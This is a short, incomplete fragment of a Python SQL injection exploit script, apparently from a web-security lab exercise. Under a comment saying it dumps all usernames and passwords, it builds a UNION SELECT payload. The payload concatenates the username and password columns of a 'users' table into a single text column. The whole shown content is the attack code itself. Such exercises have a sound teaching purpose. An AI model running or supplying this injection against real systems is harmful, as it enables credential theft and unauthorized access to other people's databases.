# DUMP all usernames and passwords using only a single column
...
def exploit_sqli(url, payload):
    ...
    null_col_list[text_col_indices[0]] = "username || '~' || password"

    union_query = "' union select " + ", ".join(f"{item}" for item in null_col_list) + " from users"
